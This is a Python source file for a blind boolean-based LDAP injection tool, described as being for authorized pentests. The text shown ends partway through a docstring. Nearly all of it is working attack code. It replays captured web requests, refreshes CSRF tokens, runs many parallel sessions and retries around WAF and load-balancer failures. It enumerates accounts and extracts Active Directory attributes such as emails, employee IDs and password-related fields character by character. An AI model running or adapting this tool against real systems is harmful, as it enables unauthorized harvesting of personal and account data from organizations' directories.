#!/usr/bin/env python3
"""
Generic blind boolean-based LDAP injection PoC / extraction tool, for any
endpoint where a request parameter is concatenated unsanitized into an LDAP
filter and the app's response differs detectably between a TRUE and FALSE
condition (a classic boolean oracle).

Authorized pentest use only. Every target-specific detail -- which field is
injectable, the TRUE/FALSE response markers, and whether/how a rotating
CSRF token needs to be refreshed -- is supplied via flags; nothing about any
specific target is hardcoded.

Usage:
  # Point at a raw request captured from a proxy (Burp "Copy to file" /
  # "Save item"), with the vulnerable field's value replaced by {{INJECT}}
  # (and, if the target rotates a CSRF token, that field's value replaced
  # by {{TOKEN}})
  python3 ldap_blind_extract.py --request-file request.txt \\
      --true-marker "<TRUE-condition response substring>" \\
      --false-marker "<FALSE-condition response substring>" \\
      --token-regex '<regex with one capture group for the fresh token>' \\
      --confirm

  # Then extract a value for an attribute via character-by-character brute force
  python3 ldap_blind_extract.py --request-file request.txt --extract --attr mail \\
      --charset abcdefghijklmnopqrstuvwxyz0123456789.@_-

  # Route through Burp for visibility while extracting
  python3 ldap_blind_extract.py --request-file request.txt --extract --attr mail --proxy http://127.0.0.1:8080

  # Quick-start fallback (no --request-file): assumes a POST form with
  # fields named Email and __RequestVerificationToken -- common in ASP.NET
  # MVC apps, but just a convenience default; use --request-file for
  # anything else
  python3 ldap_blind_extract.py --url https://target.example --path /path/to/form --confirm
"""
import argparse
import concurrent.futures
import itertools
import os
import queue
import re
import sys
import time
import urllib.parse

import requests
import urllib3

# Built by build_target() in main() from either --request-file (a raw
# HTTP request captured from a proxy) or the fallback --url/--path flags,
# and read as a module global by get_token()/post_payload() below rather
# than threading it through every call.
TARGET = None

# Retries per oracle check before giving up and marking a candidate
# inconclusive -- set from --retries in main(). Worth raising well past the
# default on a load-balanced target where only some backend nodes validate
# your session/token, since each retry has an independent chance of landing
# on a working one.
RETRIES = 3

# Directory to dump every full raw response body to, one file per request
# (numbered, tagged true/false/anomaly), set from --dump-responses in
# main(). Useful for diffing a working response against a failing one by
# hand when the true/false markers aren't enough to explain a target's
# behavior -- None (the default) disables dumping entirely.
DUMP_DIR = None
_dump_counter = itertools.count(1)

# Quick-start convenience default for the fallback (no --request-file) mode
# below -- just a common ASP.NET MVC hidden-field/antiforgery naming
# pattern, not tied to any specific target. TRUE/FALSE markers have no
# built-in default: every target's oracle wording is different, so
# --true-marker/--false-marker are always required (whichever mode you use).
DEFAULT_TOKEN_REGEX = r'name="__RequestVerificationToken"[^>]*value="([^"]+)"'
DEFAULT_BODY_TEMPLATE = "__RequestVerificationToken={{TOKEN}}&Email={{INJECT}}"

# Common AD attributes worth checking for presence on an anchored entry
# before spending requests on char-by-char extraction. Not all of these
# will exist or be LDAP-search-visible in any given schema/ACL setup --
# that's exactly what --attr-discover is for.
PROBE_CHARSET = (
    "abcdefghijklmnopqrstuvwxyz"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "0123456789"
    " .@_-\\:,'()/"
)

DEFAULT_ATTR_CANDIDATES = [
    # Core identity
    "sAMAccountName", "userPrincipalName", "displayName", "givenName", "sn", "cn",
    "initials", "name", "distinguishedName", "objectSid", "objectGUID", "objectCategory",
    "objectClass",

    # Employee / HR
    "employeeID", "employeeNumber", "employeeType", "extensionAttribute1",
    "extensionAttribute2", "extensionAttribute3", "extensionAttribute4",
    "extensionAttribute5", "extensionAttribute6", "extensionAttribute7",
    "extensionAttribute8", "extensionAttribute9", "extensionAttribute10",
    "extensionAttribute11", "extensionAttribute12", "extensionAttribute13",
    "extensionAttribute14", "extensionAttribute15", "manager", "directReports",

    # Contact
    "mail", "proxyAddresses", "targetAddress", "telephoneNumber", "mobile",
    "homePhone", "otherTelephone", "otherMobile", "facsimileTelephoneNumber",
    "ipPhone", "pager", "streetAddress", "postOfficeBox", "l", "st", "postalCode",
    "co", "c", "wWWHomePage", "url",

    # Org / job
    "department", "departmentNumber", "division", "title", "physicalDeliveryOfficeName",
    "company", "info", "comment", "description",

    # Group membership / structure
    "memberOf", "primaryGroupID", "managedBy",

    # Account state / security
    "userAccountControl", "pwdLastSet", "lastLogon", "lastLogonTimestamp",
    "lastLogoff", "badPwdCount", "badPasswordTime", "lockoutTime", "accountExpires",
    "logonCount", "logonHours", "whenCreated", "whenChanged", "adminCount",
    "msDS-User-Account-Control-Computed", "isCriticalSystemObject",

    # Auth / credential-adjacent (existence probing only -- values themselves
    # are typically not readable via a search filter, but presence still
    # narrows down account posture)
    "servicePrincipalName", "msDS-AllowedToDelegateTo", "msDS-KeyCredentialLink",
    "unicodePwd", "userPassword", "msDS-SupportedEncryptionTypes",

    # Home / profile / scripting
    "homeDirectory", "homeDrive", "scriptPath", "profilePath",

    # UNIX/POSIX (RFC2307) -- present if the domain uses NIS/POSIX extensions
    "uid", "uidNumber", "gidNumber", "unixHomeDirectory", "loginShell", "gecos",

    # Exchange / hybrid Entra ID (present if mail-enabled / hybrid-joined)
    "mailNickname", "msExchMailboxGuid", "msExchRecipientTypeDetails",
    "msExchHomeServerName", "msExchUserAccountControl", "msRTCSIP-PrimaryUserAddress",
    "msDS-cloudExtensionAttribute1", "msDS-cloudExtensionAttribute2",
    "userCertificate", "msExchArchiveGUID",
]

DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
}

# Headers that requests/the transport manages itself -- if these come from a
# captured raw request they're stale (wrong content-length once markers are
# substituted) and must be dropped rather than sent verbatim. Host is
# handled separately in build_target() (read for the scheme+host, then
# dropped) since requests derives it from the URL.
#
# Cookie is deliberately NOT in this set: dropping it entirely was tried
# and made things strictly worse against a real target (every request 500'd,
# including ones that previously worked), meaning the captured cookie
# carries something a fresh session's own Set-Cookie can't reproduce (a
# WAF/bot-mitigation cookie issued only to real browser traffic is the
# leading theory). requests.Session() will still merge in any *additional*
# Set-Cookie values the server sends back during the run on top of this.
MANAGED_HEADERS = {"content-length", "connection"}


class OracleAnomaly(Exception):
    pass


class Target:
    """
    Everything needed to fire one oracle request at a specific endpoint --
    built once in main() from either a captured raw HTTP request
    (--request-file) or the fallback --url/--path flags, then reused as a
    module-global template for every request the rest of the script makes.

    method/url/headers/body_template describe the request to replay.
    token_marker/inject_marker are literal placeholder strings inside
    body_template (and/or header values) that get substituted per-request:
    inject_marker with the current LDAP boolean payload, token_marker with
    the freshest scraped antiforgery/CSRF token (if the target uses one --
    needs_token is False when the marker isn't present anywhere, and token
    handling is skipped entirely).
    """

    def __init__(self, method, url, headers, body_template, token_marker,
                 inject_marker, token_regex, token_get_url, true_markers,
                 false_markers):
        self.method = method
        self.url = url
        self.headers = headers
        self.body_template = body_template
        self.token_marker = token_marker
        self.inject_marker = inject_marker
        self.token_regex = token_regex
        self.token_get_url = token_get_url
        self.true_markers = true_markers
        self.false_markers = false_markers
        self.needs_token = bool(token_marker) and (
            token_marker in body_template
            or any(token_marker in v for v in headers.values())
        )

    def render(self, token_value, ldap_payload):
        """Substitute token_marker/inject_marker into body + headers, each
        percent-encoded for a form-urlencoded body (the common case for
        these vulnerable forms)."""
        def sub(s):
            if self.needs_token:
                s = s.replace(self.token_marker,
                               urllib.parse.quote_plus(token_value or ""))
            if self.inject_marker:
                s = s.replace(self.inject_marker,
                               urllib.parse.quote_plus(ldap_payload))
            return s

        body = sub(self.body_template)
        headers = {k: sub(v) for k, v in self.headers.items()}
        return headers, body


def get_token(session, verify_tls, proxies):
    """GET the token endpoint fresh and scrape the rotating token, per
    TARGET.token_regex. No-op (returns None) if TARGET doesn't use one."""
    if not TARGET.needs_token:
        return None
    headers, _ = TARGET.render(None, "")
    r = session.get(TARGET.token_get_url, headers=headers,
                     verify=verify_tls, proxies=proxies, timeout=15)
    r.raise_for_status()
    m = TARGET.token_regex.search(r.text)
    if not m:
        raise RuntimeError(
            "Could not find a token in the GET response using --token-regex"
        )
    return m.group(1)


def post_payload(session, token, ldap_payload, verify_tls, proxies):
    """Fire one request per TARGET and return (is_true, response_text, next_token)."""
    headers, body = TARGET.render(token, ldap_payload)
    r = session.request(TARGET.method, TARGET.url, data=body, headers=headers,
                         verify=verify_tls, proxies=proxies, timeout=15)
    r.raise_for_status()

    if any(marker in r.text for marker in TARGET.false_markers):
        result = False
    elif any(marker in r.text for marker in TARGET.true_markers):
        result = True
    else:
        result = None

    if DUMP_DIR:
        tag = {True: "true", False: "false", None: "anomaly"}[result]
        n = next(_dump_counter)
        path = os.path.join(DUMP_DIR, f"{n:04d}_{tag}.html")
        with open(path, "w") as f:
            f.write(f"<!-- payload={ldap_payload!r} status={r.status_code} "
                     f"url={r.url} -->\n")
            f.write(r.text)

    if result is None:
        snippet = " ".join(r.text.split())[:300]
        redirect_chain = " -> ".join(
            f"{h.status_code} {h.headers.get('Location', '?')}" for h in r.history
        )
        redirect_info = f"[redirected via {redirect_chain} to {r.url}] " if r.history else "[no redirect] "
        raise OracleAnomaly(
            "Response matched neither TRUE nor FALSE marker — target may have "
            "changed, WAF triggered, or session/token desynced. "
            f"{redirect_info}[status={r.status_code} len={len(r.text)}] {snippet!r}"
        )

    next_token = None
    if TARGET.needs_token:
        m = TARGET.token_regex.search(r.text)
        next_token = m.group(1) if m else None
    return result, r.text, next_token


def build_lane_pool(n, verify_tls, proxies):
    """
    Build a queue of `n` independent (session, state) "lanes", each with its
    own cookie jar and freshly scraped antiforgery token.

    The antiforgery token only has to match the cookies on the request it
    rides along with -- it isn't a single global one-time value -- so N
    independent lanes can each walk their own get-token/post/refresh-token
    cycle in parallel without stepping on each other. A thread pool can then
    dispatch independent oracle checks (different chars, different
    candidates) across these lanes concurrently instead of serializing every
    single request behind one shared token.
    """
    q = queue.Queue()
    for _ in range(n):
        session = requests.Session()
        token = get_token(session, verify_tls, proxies)
        q.put({"session": session, "token": token})
    return q


def _check_true_pooled(pool, payload, verify_tls, proxies, delay, retries=None):
    """Same as _check_true, but pulls an idle (session, state) lane from the
    pool, uses it, and returns it -- letting a thread pool run many of these
    concurrently instead of one at a time on a single session."""
    lane = pool.get()
    try:
        result = _check_true(lane["session"], lane, payload, verify_tls, proxies,
                              delay, retries)
    finally:
        pool.put(lane)
    return result


def oracle(session, state, ldap_payload, verify_tls, proxies, delay):
    """Send one boolean payload, refreshing token as needed. Mutates state['token']."""
    if state["token"] is None:
        state["token"] = get_token(session, verify_tls, proxies)

    if delay:
        time.sleep(delay)

    result, text, next_token = post_payload(
        session, state["token"], ldap_payload, verify_tls, proxies
    )

    # Always refresh from the response if we got one; else re-fetch on next call.
    state["token"] = next_token
    return result


def confirm(session, verify_tls, proxies, delay):
    state = {"token": None}
    print("[*] Sending known-TRUE payload: *)(objectClass=*")
    is_true = oracle(session, state, "*)(objectClass=*", verify_tls, proxies, delay)
    print(f"    -> TRUE marker matched: {is_true}")

    print("[*] Sending known-FALSE payload: *)(!(objectClass=*)")
    is_false = oracle(session, state, "*)(!(objectClass=*)", verify_tls, proxies, delay)
    print(f"    -> TRUE marker matched: {is_false}")

    if is_true and not is_false:
        print("[+] Oracle confirmed: boolean-based blind LDAP injection is live.")
        return True
    else:
        print("[-] Oracle did not behave as expected. Target may have changed.")
        return False


def _check_true(session, state, payload, verify_tls, proxies, delay, retries=None):
    """
    oracle() call with retries + backoff + fresh token on anomaly.

    Returns True/False normally. If the anomaly persists past all retries
    (e.g. rate limiting, WAF, transient network blip, or -- notably -- a
    load-balanced target where each request can land on a different
    backend node and only some of them recognize your session/antiforgery
    token, so retrying is actually likely to eventually land on a working
    node), returns None ("inconclusive") instead of raising -- the caller
    treats that candidate as unmatched but the run keeps going rather than
    dying on one flaky response.
    """
    if retries is None:
        retries = RETRIES
    for attempt in range(1, retries + 1):
        try:
            return oracle(session, state, payload, verify_tls, proxies, delay)
        except (OracleAnomaly, requests.exceptions.RequestException) as e:
            backoff = max(delay, 1.0) * attempt
            print(f"[!] Anomaly (attempt {attempt}/{retries}): {e} "
                  f"-- refreshing token, backing off {backoff:.1f}s", file=sys.stderr)
            state["token"] = None
            time.sleep(backoff)

    print(f"[!] Giving up on payload after {retries} attempts, "
          f"marking inconclusive (skipped): {payload!r}", file=sys.stderr)
    return None


def ldap_escape(s):
    """
    RFC 4515 escaping for a literal value being tested as DATA inside an
    LDAP filter. Must NOT be applied to our own structural/control
    characters (the outer *)(...)( closing trick, or an intentional
    trailing '*' used for prefix wildcard search) -- only to characters
    that represent an actual candidate value or char being tested.

    Backslash must be escaped first -- otherwise the backslashes
    introduced by escaping '(' / ')' would themselves get re-escaped.

    Without this, a candidate like '(' or ')' breaks the nesting of our
    own injected filter (producing a differently-structured, often
    spuriously-TRUE filter) instead of being compared as literal data --
    this is what made every one of '\\', '(', ')', ' ' appear to "match"
    simultaneously, which is impossible for a real single-valued
    attribute and was a giveaway the results were bogus.
    """
    return (
        s.replace("\\", "\\5c")
         .replace("(", "\\28")
         .replace(")", "\\29")
         .replace("\x00", "\\00")
    )


def _build_condition(attr, value_expr, anchor_attr=None, anchor_value=None, negate=False):
    """
    Build the inner LDAP condition for attr=value_expr (value_expr may
    include a trailing '*' for a prefix match, or not for exact match).
    Callers are responsible for ldap_escape()-ing any literal/candidate
    portion of value_expr before calling this -- value_expr itself may
    legitimately contain an unescaped, intentional '*' for wildcard
    search, so escaping can't safely happen here.

    If negate is set, the attr=value_expr condition itself is wrapped in
    !(...) before anchoring -- used to build a complementary probe (see
    anchor_diag) to test whether an anchor value matches more than one
    directory entry.

    If an anchor is supplied, wraps it in an AND so the condition is only
    true for the SPECIFIC entry matching anchor_attr=anchor_value -- e.g.
    once sAMAccountName has been exact-matched (unique in AD), anchor on
    it to safely pull correlated attributes (mail, displayName, ...) of
    that same entry without risking cross-entry contamination.
    """
    inner = f"{attr}={value_expr}"
    if negate:
        inner = f"!({inner})"
    if anchor_attr and anchor_value is not None:
        return f"&({anchor_attr}={ldap_escape(str(anchor_value))})({inner})"
    return inner


def extract_values(session, verify_tls, proxies, delay, attr, charset, max_len,
                    known_prefix="", max_branches=8, anchor_attr=None, anchor_value=None,
                    case_insensitive=False, concurrency=1):
    """
    Breadth-first character-by-character extraction of ALL values for
    `attr` that share prefixes, via boolean oracle.

    A greedy first-match approach (take the first char that returns TRUE)
    silently jumps between unrelated directory entries whenever a prefix
    is ambiguous -- e.g. entries "abartholomew" and "aaronsmith" both
    exist, so after matching 'a' the greedy walk can wander from one
    entry into the other and stitch together a value nobody actually has.

    This instead tracks every prefix still consistent with the oracle at
    each position (the "frontier") and expands all of them in parallel,
    only closing a branch out once its exact-match check fires true (a
    real, complete value) or it has no further matching characters (a
    dead end / anomaly). Slower, but immune to cross-entry contamination.

    Payload shape mirrors the confirmed working structure:
      *)(<condition>)(objectClass=*

    If anchor_attr/anchor_value are set, <condition> becomes a compound
    AND filter binding extraction of `attr` to one specific, already
    exact-matched entry -- e.g. after confirming sAMAccountName=jdoe,
    anchor on it to pull that same account's mail/displayName with no
    ambiguity about which directory entry the data came from.

    Many AD string attributes compare case-insensitively, so both 'm'
    and 'M' independently evaluate TRUE for the same real character --
    with case_insensitive=False (default) both get added as separate
    branches, doubling the frontier at every alphabetic position and
    quickly hitting max_branches truncation on pure case-noise instead
    of real ambiguity. With case_insensitive=True, matches are
    deduplicated by casefold() before joining the next frontier, so only
    one case variant per real character survives -- the extracted value
    may not reflect the attribute's true casing, but the branch count
    stays tied to real ambiguity instead of case redundancy.
    """
    pool = build_lane_pool(concurrency, verify_tls, proxies) if concurrency > 1 else None

    def check(payload):
        if pool is not None:
            return _check_true_pooled(pool, payload, verify_tls, proxies, delay)
        return _check_true(session, state, payload, verify_tls, proxies, delay)

    def check_many(payloads):
        """Run a batch of independent oracle checks, in parallel across the
        lane pool if concurrency > 1, else serially. Returns results in the
        same order as `payloads`."""
        if pool is None or len(payloads) <= 1:
            return [check(p) for p in payloads]
        with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as ex:
            return list(ex.map(check, payloads))

    state = {"token": None}
    frontier = [known_prefix]
    completed = []
    inconclusive = []  # (prefix, candidate_or_None) pairs we couldn't resolve

    if anchor_attr:
        print(f"[*] Anchoring extraction of '{attr}' to {anchor_attr}={anchor_value!r}")

    depth = len(known_prefix)
    while frontier and depth < max_len:
        print(f"[*] Depth {depth}: expanding {len(frontier)} branch(es): {frontier}")
        next_frontier = []

        # Phase 1: exact-match check for every prefix in the frontier, in
        # parallel -- these are fully independent of each other.
        exact_targets = [p for p in frontier if p]
        exact_payloads = [
            f"*)({_build_condition(attr, ldap_escape(p), anchor_attr, anchor_value)})(objectClass=*"
            for p in exact_targets
        ]
        exact_results = dict(zip(exact_targets, check_many(exact_payloads)))

        to_branch = []
        for prefix in frontier:
            exact_result = exact_results.get(prefix) if prefix else False
            if exact_result is None:
                print(f"[!] Exact-match check for '{prefix}' inconclusive, "
                      f"treating as not-yet-complete and continuing to branch it.")
                inconclusive.append((prefix, None))
                to_branch.append(prefix)
            elif exact_result:
                print(f"[+] Exact match confirmed at length {len(prefix)}: {prefix}")
                completed.append(prefix)
            else:
                to_branch.append(prefix)

        # Phase 2: charset probe for every (prefix, char) pair still in play,
        # in one big parallel batch across the whole depth.
        pairs = [(prefix, c) for prefix in to_branch for c in charset]
        pair_payloads = [
            f"*)({_build_condition(attr, ldap_escape(prefix + c) + '*', anchor_attr, anchor_value)})(objectClass=*"
            for prefix, c in pairs
        ]
        pair_results = check_many(pair_payloads)

        by_prefix = {p: [] for p in to_branch}
        for (prefix, c), result in zip(pairs, pair_results):
            by_prefix[prefix].append((c, result))

        for prefix in to_branch:
            matches = []
            seen_casefold = set()
            case_collision = False
            for c, result in by_prefix[prefix]:
                candidate = prefix + c
                if result is None:
                    inconclusive.append((prefix, candidate))
                elif result:
                    cf = candidate.casefold()
                    if cf in seen_casefold:
                        case_collision = True
                        if case_insensitive:
                            continue
                    seen_casefold.add(cf)
                    matches.append(candidate)

            if case_collision and not case_insensitive:
                print(f"[!] '{prefix}' matched multiple charset characters differing "
                      f"only by case -- this attribute likely compares case-"
                      f"insensitively. Consider re-running with --case-insensitive "
                      f"to avoid branch-count doubling from case noise.")

            if not matches:
                if prefix:
                    print(f"[-] Dead end at '{prefix}' -- no exact match, "
                          f"no further characters. Discarding branch.")
                continue

            if len(matches) > max_branches:
                print(f"[!] '{prefix}' branched into {len(matches)} candidates, "
                      f"truncating to first {max_branches} (--max-branches to raise)")
                matches = matches[:max_branches]

            next_frontier.extend(matches)

        frontier = next_frontier
        depth += 1

    if inconclusive:
        print(f"[!] {len(inconclusive)} candidate(s) could not be resolved due to "
              f"persistent anomalies -- results below may be INCOMPLETE:")
        for prefix, candidate in inconclusive:
            print(f"    prefix={prefix!r} candidate={candidate!r}")

    if frontier:
        print(f"[!] Hit max_len={max_len} with {len(frontier)} incomplete branch(es) "
              f"still active: {frontier}")

    return completed


def load_candidates(wordlist, range_format, range_start, range_end):
    """
    Build a candidate list for --enumerate from a wordlist file and/or a
    numeric range with a format pattern (e.g. range_format="e{:04d}",
    range_start=1, range_end=9999 -> "e0001".."e9999").
    """
    candidates = []
    if wordlist:
        with open(wordlist) as f:
            candidates.extend(line.strip() for line in f if line.strip())
    if range_format and range_start is not None and range_end is not None:
        candidates.extend(range_format.format(i) for i in range(range_start, range_end + 1))
    return candidates


def enumerate_values(session, verify_tls, proxies, delay, attr, candidates, concurrency=1):
    """
    Cold-start discovery of unknown entries via exact-equality checks
    against externally supplied candidates, instead of character-by-
    character prefix brute force.

    Prefix wildcard search (attr=x*) is ambiguous across an entire
    directory -- confirmed by anchor_diag/diag: almost any short prefix
    matches SOME entry, so branching search degenerates into noise with
    no anchor to bind it to one person. A full exact-equality match
    (attr=candidate) doesn't have that problem: collision only happens if
    two entries genuinely share the exact same value, which is rare for
    identifier-shaped attributes (usernames, employee/badge IDs, etc.).

    This trades the character-by-character branching for a flat sweep:
    one oracle check per candidate, no wildcards involved.
    """
    total = len(candidates)
    payloads = [f"*)({attr}={ldap_escape(c)})(objectClass=*" for c in candidates]

    hits = []
    if concurrency > 1:
        pool = build_lane_pool(concurrency, verify_tls, proxies)
        with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as ex:
            results = list(ex.map(
                lambda p: _check_true_pooled(pool, p, verify_tls, proxies, delay), payloads))
    else:
        state = {"token": None}
        results = [_check_true(session, state, p, verify_tls, proxies, delay) for p in payloads]

    for i, (candidate, result) in enumerate(zip(candidates, results), 1):
        status = "HIT" if result else ("inconclusive" if result is None else "miss")
        print(f"[{i}/{total}] {candidate!r} -> {status}")
        if result:
            hits.append(candidate)

    print(f"\n[RESULT] {attr} -> {len(hits)} hit(s) out of {total} candidate(s):")
    for h in hits:
        print(f"  {h!r}")
    if hits:
        print(
            "\n[*] Exact matches are low-collision but not guaranteed unique -- "
            "before trusting any hit as a single-entry anchor for correlated "
            f"extraction, run --anchor-diag --anchor-attr {attr} --anchor-value "
            "<hit> to confirm it isn't matching more than one entry."
        )
    return hits


def diag(session, verify_tls, proxies, delay, attr, known_value):
    """
    Isolate why brute force finds nothing new while exact matches on
    known values succeed. Runs four oracle checks against a value you
    already know is correct and prints raw TRUE/FALSE for each:

      1. Exact equality:        attr=<known_value>          (expect TRUE)
      2. Full-value prefix:     attr=<known_value>*          (expect TRUE if wildcard works at all)
      3. First-char prefix:     attr=<first char>*           (expect TRUE if prefix search works)
      4. Wrong first-char:      attr=<known char + 1>*       (expect FALSE -- sanity control)

    If (1) is TRUE but (2)/(3) are FALSE, wildcard/substring matching is
    broken or being stripped -- that's why extraction can't discover
    anything not already known character-by-character, even though the
    oracle itself is sound.
    """
    if not known_value:
        print("[!] --diag requires --known-value (a value you already know is correct)")
        return

    state = {"token": None}

    tests = [
        ("exact equality", f"{attr}={ldap_escape(known_value)}"),
        ("full-value prefix (attr=value*)", f"{attr}={ldap_escape(known_value)}*"),
        ("first-char prefix (attr=c*)", f"{attr}={ldap_escape(known_value[0])}*"),
        ("wrong first-char (sanity control, expect FALSE)",
         f"{attr}={ldap_escape(chr(ord(known_value[0]) + 1))}*"),
    ]

    print(f"[*] Diagnosing wildcard behavior for {attr}={known_value!r}\n")
    for label, cond in tests:
        payload = f"*)({cond})(objectClass=*"
        result = _check_true(session, state, payload, verify_tls, proxies, delay)
        print(f"    [{label}] payload={payload!r} -> {result}")

    print(
        "\n[*] Interpretation: if 'exact equality' is True but the two "
        "wildcard tests are False, substring/wildcard matching on this "
        "attribute is not working (escaped '*', unindexed attribute, or "
        "app-level filtering) -- extraction needs an equality-only "
        "strategy instead of prefix brute force. If ALL are False, the "
        "oracle/token handling itself regressed -- re-run --confirm."
    )


def anchor_diag(session, verify_tls, proxies, delay, anchor_attr, anchor_value,
                 probe_attr="sAMAccountName", probe_char="a"):
    """
    Verify an anchor value pins exactly ONE directory entry before trusting
    it for correlated-attribute extraction.

    A boolean oracle can't return a count directly, so this tests two
    mutually exclusive conditions ANDed with the anchor:

      R1: &(anchor)(probe_attr=<probe_char>*)
      R2: &(anchor)(!(probe_attr=<probe_char>*))

    For a SINGLE entry, exactly one of these can be true (its probe_attr
    either starts with probe_char or it doesn't -- not both). If BOTH come
    back true, at least two distinct entries satisfy the anchor -- one
    with a matching probe_attr, one without -- so the anchor is not unique
    and any attribute pulled "through" it (e.g. --anchor-attr mail
    --extract --attr sAMAccountName) may be stitching together values from
    different people.
    """
    if not anchor_attr or anchor_value is None:
        print("[!] --anchor-diag requires --anchor-attr and --anchor-value")
        return

    state = {"token": None}
    print(f"[*] Diagnosing anchor uniqueness for {anchor_attr}={anchor_value!r} "
          f"(probing against {probe_attr}={probe_char!r}*)\n")

    base_cond = _build_condition(anchor_attr, ldap_escape(anchor_value))
    base_payload = f"*)({base_cond})(objectClass=*"
    base_result = _check_true(session, state, base_payload, verify_tls, proxies, delay)
    print(f"    [anchor alone] payload={base_payload!r} -> {base_result}")

    if base_result is not True:
        print(
            "\n[!] The anchor value itself did not evaluate true -- it doesn't "
            "match any entry (or the oracle is desynced). Re-check the anchor "
            "value before trusting anything downstream; not proceeding to the "
            "probe conditions."
        )
        return

    pos_cond = _build_condition(probe_attr, ldap_escape(probe_char) + "*", anchor_attr, anchor_value)
    pos_payload = f"*)({pos_cond})(objectClass=*"
    pos_result = _check_true(session, state, pos_payload, verify_tls, proxies, delay)
    print(f"    [anchor AND {probe_attr}={probe_char}*] payload={pos_payload!r} -> {pos_result}")

    neg_cond = _build_condition(probe_attr, ldap_escape(probe_char) + "*", anchor_attr, anchor_value, negate=True)
    neg_payload = f"*)({neg_cond})(objectClass=*"
    neg_result = _check_true(session, state, neg_payload, verify_tls, proxies, delay)
    print(f"    [anchor AND NOT {probe_attr}={probe_char}*] payload={neg_payload!r} -> {neg_result}")

    print()
    if pos_result and neg_result:
        print(
            f"[-] NOT UNIQUE: both '{probe_attr} starts with {probe_char!r}' and its "
            f"negation are true under this anchor -- at least two entries match "
            f"{anchor_attr}={anchor_value!r}. Do not use this anchor for correlated "
            f"extraction yet; tighten it (a more specific anchor_attr, or AND in an "
            f"additional known-unique condition) until this check comes back clean."
        )
    elif pos_result is None or neg_result is None:
        print(
            "[!] One or both probe checks were inconclusive (oracle anomalies). "
            "Re-run with a smaller --delay increase or a different --probe-char "
            "before trusting the result."
        )
    elif pos_result != neg_result:
        print(
            f"[+] Consistent with a UNIQUE match: exactly one of the two "
            f"complementary probe conditions was true under this anchor. "
            f"Safe to proceed with --extract --anchor-attr {anchor_attr} "
            f"--anchor-value {anchor_value!r}."
        )
    else:
        print(
            "[!] Both probe conditions came back false, which shouldn't happen "
            "for a partition of a non-empty set -- oracle may be unreliable "
            "here. Re-run --confirm, or try a different --probe-attr/--probe-char."
        )


def attr_discover(session, verify_tls, proxies, delay, anchor_attr, anchor_value, candidate_attrs):
    """
    Test which attributes are populated (and LDAP-search-visible) on one
    anchored entry via existence checks (attr=*), instead of guessing
    from generic AD schema knowledge or spending char-by-char extraction
    requests on attributes that turn out empty/ACL-restricted/absent.
    """
    if not anchor_attr or anchor_value is None:
        print("[!] --attr-discover requires --anchor-attr and --anchor-value")
        return

    state = {"token": None}
    print(f"[*] Discovering populated attributes for {anchor_attr}={anchor_value!r} "
          f"({len(candidate_attrs)} candidate(s))\n")

    found = []
    inconclusive = []
    for attr in candidate_attrs:
        cond = _build_condition(attr, "*", anchor_attr, anchor_value)
        payload = f"*)({cond})(objectClass=*"
        result = _check_true(session, state, payload, verify_tls, proxies, delay)
        status = "present" if result else ("inconclusive" if result is None else "absent")
        print(f"    [{attr}] payload={payload!r} -> {status}")
        if result:
            found.append(attr)
        elif result is None:
            inconclusive.append(attr)

    print(f"\n[RESULT] {len(found)}/{len(candidate_attrs)} attribute(s) present:")
    for attr in found:
        print(f"  {attr}")
    if inconclusive:
        print(f"\n[!] {len(inconclusive)} inconclusive (oracle anomalies), re-check individually: "
              f"{inconclusive}")
    if found:
        print(
            "\n[*] Next: --extract --anchor-attr {a} --anchor-value {v!r} --attr <name> "
            "for any attribute above worth pulling a value for."
            .format(a=anchor_attr, v=anchor_value)
        )


def charset_probe(session, verify_tls, proxies, delay, anchor_attr, anchor_value,
                   attr, probe_charset):
    """
    Distinguish "extraction died because the real value uses characters
    outside --charset" from "extraction died because this attribute's
    LDAP syntax doesn't support substring/wildcard matching at all"
    (common for Integer/LargeInteger-syntax attributes like lastLogon,
    pwdLastSet, userAccountControl -- no charset fixes that).

    Runs one existence check (attr=*) to confirm the attribute is
    populated, then one wildcard prefix check per character in
    probe_charset (a broad superset covering upper/lowercase, digits,
    space, and common path/name punctuation). If existence is TRUE but
    NO character in the broad set matches, wildcard search is not
    working on this attribute at all -- switch to --extract-numeric (if
    numeric-shaped) instead of widening --charset further.
    """
    if not anchor_attr or anchor_value is None:
        print("[!] --charset-probe requires --anchor-attr and --anchor-value")
        return

    state = {"token": None}
    print(f"[*] Probing character coverage for {attr} on {anchor_attr}={anchor_value!r}\n")

    exist_cond = _build_condition(attr, "*", anchor_attr, anchor_value)
    exist_payload = f"*)({exist_cond})(objectClass=*"
    exist_result = _check_true(session, state, exist_payload, verify_tls, proxies, delay)
    print(f"    [existence: {attr}=*] -> {exist_result}")
    if exist_result is not True:
        print(
            "\n[!] Attribute doesn't exist / isn't populated for this entry (or the "
            "oracle is desynced) -- nothing further to probe."
        )
        return

    matches = []
    for c in probe_charset:
        cond = _build_condition(attr, ldap_escape(c) + "*", anchor_attr, anchor_value)
        payload = f"*)({cond})(objectClass=*"
        result = _check_true(session, state, payload, verify_tls, proxies, delay)
        if result:
            matches.append(c)

    print(f"\n[RESULT] {len(matches)}/{len(probe_charset)} character(s) matched at "
          f"position 0: {matches}")

    if matches:
        print(
            "\n[*] Wildcard matching works on this attribute -- re-run --extract with "
            f"--charset '{''.join(matches) if len(matches) < len(probe_charset) else probe_charset}' "
            "(or a superset) instead of the email-shaped default charset."
        )
    else:
        print(
            "\n[-] No character in the broad probe set matched, despite the attribute "
            "existing. This attribute's LDAP syntax most likely doesn't support "
            "substring/wildcard filters at all (typical for Integer/LargeInteger-"
            "syntax attributes: lastLogon, pwdLastSet, userAccountControl, "
            "badPwdCount, lockoutTime). Use --extract-numeric instead of --extract "
            "for this attribute."
        )


def _numeric_le_condition(attr, value, anchor_attr=None, anchor_value=None):
    inner = f"{attr}<={value}"
    if anchor_attr and anchor_value is not None:
        return f"&({anchor_attr}={anchor_value})({inner})"
    return inner


def extract_numeric(session, verify_tls, proxies, delay, attr, anchor_attr, anchor_value,
                     lo, hi):
    """
    Binary-search extraction for Integer/LargeInteger-syntax attributes
    (lastLogon, pwdLastSet, userAccountControl, badPwdCount,
    lockoutTime, ...) that don't support substring/wildcard matching --
    confirmed via --charset-probe. Uses LDAP's <= ordering comparison
